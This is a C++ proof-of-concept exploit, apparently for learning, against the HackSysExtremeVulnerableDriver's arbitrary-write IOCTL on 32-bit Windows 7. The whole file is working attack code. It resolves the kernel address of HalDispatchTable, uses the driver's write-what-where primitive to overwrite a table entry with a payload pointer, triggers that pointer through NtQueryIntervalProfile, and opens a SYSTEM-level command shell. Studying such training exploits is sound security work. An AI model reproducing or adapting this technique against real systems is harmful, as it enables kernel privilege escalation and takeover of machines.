#include <iostream>
#include <Windows.h>
#include <Psapi.h>

// x86 isn't used much anymore and I went way more in depth about how the exploit works in the x64 version
// On windows 7 both exploits are pretty much the same so for more technical details read the comments on that version

extern "C" void __stdcall payload(void);

typedef NTSTATUS(WINAPI* NtQueryIntervalProfilePtr)(IN ULONG ProfileSource, OUT PULONG Interval);

struct WriteWhatWhere
{
	uintptr_t what;
	uintptr_t where;
};

LPVOID GetKernelModuleBaseAddress(const char* moduleName)
{
	LPVOID lpImageBase[1024];
	DWORD bytes_recieved, number_of_drivers;
	CHAR szDeviceName[1024];
	// Get an array of driver base addresses
	if (EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &bytes_recieved))
	{
		number_of_drivers = bytes_recieved / sizeof(LPVOID);
		for (int i = 0; i < number_of_drivers; i++)
		{
			// Get the driver names from the base addresses
			if (GetDeviceDriverBaseNameA(lpImageBase[i], szDeviceName, sizeof(szDeviceName)) > 0)
			{
				if (strcmp(szDeviceName, moduleName) == 0)
				{
					return lpImageBase[i];
				}
			}
		}
	}
	return (LPVOID)-1;
}

int main()
{
	HANDLE driver;
	HMODULE ntdll, ntkrnlpa;
	ULONG returnLength;
	DWORD bytes_returned;
	uintptr_t ntkrnlpaBaseAddress, HalDispatchTableAddy;
	uintptr_t payloadAddy = (uintptr_t)payload;
	STARTUPINFOA startInfo;
	PROCESS_INFORMATION procInfo;
	WriteWhatWhere* data;
	NtQueryIntervalProfilePtr NtQueryIntervalProfile;
	int ioctl_opcode = 0x22200b;
	const char* driverPath = "\\\\.\\HackSysExtremeVulnerableDriver";
	const char* ntkrnlpaPath = "C:\\windows\\system32\\ntkrnlpa.exe";
	char out[64];

	printf("HEVD Write What Where x86\n");

	// Get the base address of ntdll.dll in user mode to get the address of NtQueryIntervalProfile
	// which calls the second member of the HalDispatchTable array of function pointers in the kernel which we overwrite
	// with our write primitive
	printf("Getting handle to ntdll\n");
	ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll == NULL)
	{
		printf("[-] Error %d getting handle to ntdll.dll\n", GetLastError());
		return 0;
	}
	printf("[+] Got a handle to ntdll\n", ntdll);

	printf("Getting address of NtQueryIntervalProfile\n");
	NtQueryIntervalProfile = (NtQueryIntervalProfilePtr)GetProcAddress(ntdll, "NtQueryIntervalProfile");
	if (NtQueryIntervalProfile == NULL)
	{
		printf("[-] Error %d getting address of NtQueryIntervalProfile\n", GetLastError());
		return 0;
	}
	printf("[+] Found NtQueryIntervalProfile address %p\n", NtQueryIntervalProfile);

	// Get the base address of ntkrnlpa (not ntoskrnl.exe in this case) to add the offset to the HalDispatchTable
	// (found via loading into user mode) to get the kernel address of the array
	printf("Getting kernel base address\n");
	ntkrnlpaBaseAddress = (uintptr_t)GetKernelModuleBaseAddress("ntkrnlpa.exe");
	if (ntkrnlpaBaseAddress == -1)
	{
		printf("[-] Error getting kernel base address\n");
		return 0;
	}
	printf("[+] ntkrnlpa.exe base address %p\n", ntkrnlpaBaseAddress);

	printf("Loading user mode instance of ntkrnlpa.exe\n");
	ntkrnlpa = LoadLibraryA(ntkrnlpaPath);
	if (ntkrnlpa == NULL)
	{
		printf("[-] Error %d loading ntkrnlpa.exe\n", GetLastError());
		return 0;
	}
	printf("[+] Loaded ntkrnlpa.exe in user mode\n");

	printf("Getting the kernel address of the HalDispatchTable\n");
	HalDispatchTableAddy = (uintptr_t)GetProcAddress(ntkrnlpa, "HalDispatchTable");
	if (HalDispatchTableAddy == NULL)
	{
		printf("[-] Error %d getting user mode address of the HalDispatchTable\n", GetLastError());
		return 0;
	}
	HalDispatchTableAddy = (HalDispatchTableAddy - (uintptr_t)ntkrnlpa) + ntkrnlpaBaseAddress;
	printf("[+] HalDispatchTable kernel address %p\n", HalDispatchTableAddy);

	// Create our WriteWhatWhere structure utilized by the driver IOCTL to overwrite the
	// second member of the HalDispatchTable array with the address of our payload function
	printf("Creating WriteWhatWhere structure\n");
	data = (WriteWhatWhere*)malloc(sizeof(WriteWhatWhere));
	if (data == 0)
	{
		printf("[-] Error %d allocating memory for structure\n", GetLastError());
		return 0;
	}
	printf("Structure at %p\n", data);
	data->what = (uintptr_t)&payloadAddy;
	printf("What address %p\n", data->what);
	data->where = HalDispatchTableAddy + sizeof(uintptr_t);
	printf("Where address %p\n", data->where);

	// Get a handle to the driver and send our WriteWhatWhere structure to the HEVD_IOCTL_ARBITRARY_WRITE
	// IOCTL branch
	printf("Opening a handle to HEVD\n");
	driver = CreateFileA(driverPath, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver == INVALID_HANDLE_VALUE)
	{
		printf("[-] Error %d opening handle to driver\n", GetLastError());
		free(data);
		return 0;
	}
	printf("[+] Opened handle to driver %p\n", driver);

	printf("Sending IOCTL code to driver\n");
	if (!DeviceIoControl(driver, ioctl_opcode, data, sizeof(WriteWhatWhere), out, 64, &bytes_returned, 0))
	{
		printf("[-] Error %d sending IOCTL code to driver\n", GetLastError());
		free(data);
		CloseHandle(driver);
		return 0;
	}
	printf("[+] Payload sent to driver!\n");
	free(data);
	CloseHandle(driver);
	
	// Call NtQueryIntervalProfile so our function gets called and executed
	printf("Calling NtQueryIntervalProfile to exeute payload\n");
	NtQueryIntervalProfile(2, &bytes_returned);

	printf("Payload should have executed, opening shell!\n");

	// We should have a system security token at this point to do what we want
	// in the case of this POC it opens a shell with system permissions
	memset(&startInfo, 0, sizeof(STARTUPINFOA));
	startInfo.cb = sizeof(STARTUPINFOA);
	if (!CreateProcessA(0, (LPSTR)"cmd.exe", 0, 0, 0, 0, 0, 0, &startInfo, &procInfo))
	{
		printf("[-] Error %d starting shell\n", GetLastError());
	}
	else
	{
		WaitForSingleObject(procInfo.hProcess, INFINITE);
		CloseHandle(procInfo.hThread);
		CloseHandle(procInfo.hProcess);
	}

	return 0;
}